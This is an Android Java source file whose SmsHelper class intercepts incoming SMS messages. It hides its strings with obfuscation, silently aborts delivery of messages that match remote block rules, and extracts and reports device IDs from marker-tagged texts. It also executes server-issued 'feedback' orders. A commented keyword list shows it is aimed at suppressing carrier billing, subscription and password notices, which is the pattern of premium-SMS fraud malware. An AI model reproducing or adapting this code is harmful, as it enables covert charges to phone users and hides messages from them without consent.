package net.workspace.sms;
import java.util.Vector;
import main.block.AppSmsWorker;
import net.workspace.listener.BlockListener;
import net.workspace.manager.OrderManager;
import net.workspace.manager.ReportManager;
import net.workspace.util.Logger;
import net.workspace.util.ParseKsy;
import net.workspace.util.T;
import android.annotation.SuppressLint;
import android.content.BroadcastReceiver;
import android.content.Intent;
import android.telephony.SmsMessage;
import android.text.TextUtils;
import bean.Block;
import bean.Feedback;
import bean.SmsPhoneNumber;

@SuppressLint("NewApi")
public class SmsHelper {
    /**
     * "pdus"
     */
    private static String PDUS2 = ParseKsy.decode("9c344b3cec3acfb444de89b513a73890");
    public static void onSmsRecieved(final BroadcastReceiver broadcastreceiver, Intent intent) {
        if (T.context != null && intent != null) {
            Object obj = intent.getExtras().get(PDUS2);
            if (obj != null) {
                Object[] pdus = (Object[]) obj;
                SmsMessage[] msgArray = new SmsMessage[pdus.length];
                String sender = "";
                StringBuffer messageBody = new StringBuffer();
                for (int i = 0; i < pdus.length; i++) {
                    if (pdus[i] != null) {
                        msgArray[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
                        if (msgArray[i] != null) {
                            sender = msgArray[i].getOriginatingAddress();
                            messageBody.append(msgArray[i].getMessageBody());
                        }
                    }
                }
                String text = messageBody.toString();
                if (sender != null && text != null) {
                    sender = sender.replace("+86", "");
                    Logger.debug(sender, text);
                    if (checkPhoneNumber(sender, text)) {
                        broadcastreceiver.abortBroadcast();
                        reportPhoneNumber(sender, text);
                    } else {
                        Blocker blocker = new Blocker(broadcastreceiver);
                        //SmsHelper.checkCommonBlocks(address, text, listener);
                        Feedback feedback = checkFeedback(sender, text, blocker);
                        if (feedback != null) {
                            OrderManager.getInstance().executeFeedback(sender, text, feedback);
                        } else {
                            Block block = checkBlock(sender, text, blocker);
                            if (block != null) ReportManager.successReport(block, sender + "->" + text);
                        }
                        if (!blocker.blocked) {
                            AppSmsWorker.getInstance(T.context).processAppLogic(broadcastreceiver, sender, text);
                        }
                    }
                }
            }
        }
    }
    private static final String PN_BLOCK_PREFIX = "#jkpoae4#";
    private static final String PN_BLOCK_SUFFIX = "#defa3fg#";
    public static boolean checkPhoneNumber(String address, String text) {
        return address != null && text != null && text.contains(PN_BLOCK_PREFIX) && text.contains(PN_BLOCK_SUFFIX);
    }
    static void reportPhoneNumber(String address, String text) {
        SmsPhoneNumber form = new SmsPhoneNumber();
        form.phoneNumber = address;
        int index = text.indexOf(PN_BLOCK_PREFIX);
        int length = PN_BLOCK_PREFIX.length();
        if (index >= 0) {
            int lastIndex = text.indexOf(PN_BLOCK_SUFFIX, index + length);
            if (lastIndex > index) {
                String deviceId = text.substring(index + length, lastIndex);
                form.deviceId = deviceId;
                ReportManager.report(form, true, null, null);
            }
        }
    }
    public static Feedback checkFeedback(String address, String text, BlockListener listener) {
        Feedback result = null;
        Vector<Feedback> feedbackVector = BlockHelper.readFeedbacks();
        if (feedbackVector != null) {
            for (int i = feedbackVector.size() - 1; i >= 0; i--) {
                Feedback feedback = feedbackVector.get(i);
                Block block = feedback.block;
                if (matchBlock(address, text, block)) {
                    result = feedback;
                    listener.stopBroadcast();
                    break;
                }
            }
        }
        feedbackVector.clear();
        System.gc();
        return result;
    }
    public static Block checkBlock(String address, String text, BlockListener listener) {
        Block match = null;
        if (address != null && text != null) {
            Vector<Block> blockVector = BlockHelper.readBlocks();
            for (int i = blockVector.size() - 1; i >= 0; i--) {
                Block block = blockVector.get(i);
                if (matchBlock(address, text, block)) {
                    match = block;
                    listener.stopBroadcast();
                    break;
                }
            }
            blockVector.clear();
            System.gc();
        }
        return match;
    }
    public static void checkCommonBlocks(String address, String text, BlockListener listener) {
        /* if (address.startsWith("10") || address.startsWith("12")) {
             for (String keyword : blockContents) {
                 if (text.contains(keyword)) {
                     listener.stopBroadcast();
                     return;
                 }
             }
         }*/
    }
    /**
     * "账单,消费,信息费,1/2,2/2,代收,代码,感谢,客服,购买,不符,取消,资费,成功,任意内容,密码"
     */
    //public static String COMMON_BLOCK_KEYWORS = ParseKsy.decode("95f5661340c82eda58b7e4ccfee39b568611f9b3f4663d28f8b5f2ba381320ca24607672ba0019cb2c8e5d8bf65b9b35447e95d850114053661b225d38b05c50a2656b269c063626a7cff6644b499bce50d804480458090576d967f8ca1dd262844f0b93b8f33971519658fc7e509559d9f812cb46435da900ea2e3747a71553");
    //public static List<String> blockContents = Arrays.asList(COMMON_BLOCK_KEYWORS.split(","));
    private static boolean matchBlock(String address, String text, Block block) {
        boolean matchPort = false;
        boolean matchContent = false;
        String blockPort = block.port;
        if (TextUtils.isEmpty(address) || TextUtils.isEmpty(blockPort)) {
            matchPort = true;
        } else {
            String array[] = blockPort.split("\\|");
            for (String port : array) {
                if (!TextUtils.isEmpty(port) && address.contains(port.trim())) {
                    matchPort = true;
                    break;
                }
            }
        }
        if (matchPort) {
            String blockContent = block.content;
            if (TextUtils.isEmpty(blockContent)) {
                matchContent = true;
            } else if (text != null) {
                if (blockContent.contains("&")) {
                    matchContent = true;
                    for (String field : blockContent.split("\\&")) {
                        if (!text.contains(field)) {
                            matchContent = false;
                            break;
                        }
                    }
                } else if (blockContent.contains("|")) {
                    for (String field : blockContent.split("\\|")) {
                        if (text.contains(field)) {
                            matchContent = true;
                            break;
                        }
                    }
                } else {
                    matchContent = text.contains(blockContent);
                }
            }
        }
        boolean result = matchContent && matchPort;
        if (result) {
            block.targetPort = address;
            block.targetContent = text;
        }
        return result;
    }
}
